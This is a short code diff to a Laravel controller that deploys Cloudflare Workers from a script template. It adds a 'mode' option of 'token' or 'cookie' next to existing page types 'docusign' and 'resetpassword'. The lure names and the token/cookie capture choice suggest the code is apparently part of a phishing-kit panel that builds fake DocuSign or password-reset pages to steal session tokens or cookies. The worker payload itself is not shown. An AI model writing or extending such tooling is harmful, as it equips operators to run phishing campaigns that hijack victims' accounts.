@@ -21,13 +21,15 @@ class CloudflareWorkerController extends Controller
     public function store(Request $request)
 {
     
-    $request->validate([
-        'name' => [
-            'required',
-            'regex:/^(?!-)[a-z0-9-]{3,63}(?<!-)$/',
-        ],
-        'type' => 'required|in:docusign,resetpassword'
-    ]);
+  $request->validate([
+    'name' => [
+        'required',
+        'regex:/^(?!-)[a-z0-9-]{3,63}(?<!-)$/',
+    ],
+    'type' => 'required|in:docusign,resetpassword',
+    'mode' => 'required|in:token,cookie'
+]);
+$mode = $request->mode;
 
     $user = auth()->user();
 
@@ -49,6 +51,7 @@ class CloudflareWorkerController extends Controller
 
     // inject HTML
     $script = str_replace('HTML_CONTENT', json_encode($html), $script);
+    $script = str_replace('{{MODE}}', $mode, $script);
 
     // inject API KEY (kalau masih mau pakai)
     $script = str_replace('{{API_KEY}}', $user->api_key, $script);
